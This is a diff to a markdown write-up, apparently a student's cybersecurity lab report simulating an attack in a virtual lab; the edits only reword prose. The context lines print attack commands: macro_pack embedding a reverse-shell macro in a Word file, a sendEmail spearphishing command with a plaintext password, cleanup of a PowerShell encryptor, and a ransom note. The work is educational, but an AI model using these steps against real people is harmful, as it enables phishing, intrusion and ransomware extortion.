@@ -101,7 +101,7 @@ To inject this payload into a Word document, I used `macro_pack` by executing th
 macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
 ```
 ![Preliminaries](images/preliminaries.png)
-> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features. Therefore, I ran the `macro_pack` command on an appropriate Windows VM (not previously mentioned for clarity).
+> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features. Therefore, I ran the `macro_pack` command on a suitable Windows VM (which was not explicitly mentioned for clarity and global comprehension).
 
 <br/>
 
@@ -111,7 +111,7 @@ Consequently, I postulated that the adversary successfully acquired **Valid Cred
 ```
 sendEmail -f alberto.bartoli@units.it -t enrico.piccin@units.it -u "Cybersecurity Exam - Results" -m "I have attached the results of today's Cybersecurity Exam. Open the attachment to see grades and errors." -a /home/kali/Desktop/innocent_stuff/malicious.docm -s 192.168.56.250:25 -xu alberto.bartoli@units.it -xp albertobartoli
 ```
-In this command, `192.168.56.250` represents the IPv4 address of the custom SMTP Server hosting the `units.it` replica domain.
+In this command, `192.168.56.250` represents the IPv4 Address of the custom SMTP Server hosting the `units.it` replica domain.
 
 ![Spearphishing](images/spearphishing.png)
 
@@ -228,7 +228,7 @@ and remove both the key and the Powershell script from the victim’s machine:
 rm C:\\Users\\enrico\\Documents\\encryption_key.bin
 rm C:\\Users\\enrico\\Documents\\encrypt.ps1
 ```
-To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file within the disrupted folder:
+To inform the victim of the compromise and demand a ransom, I leave a message as a `README.txt` file within the disrupted folder:
 ```
 execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\README.txt"
 ```
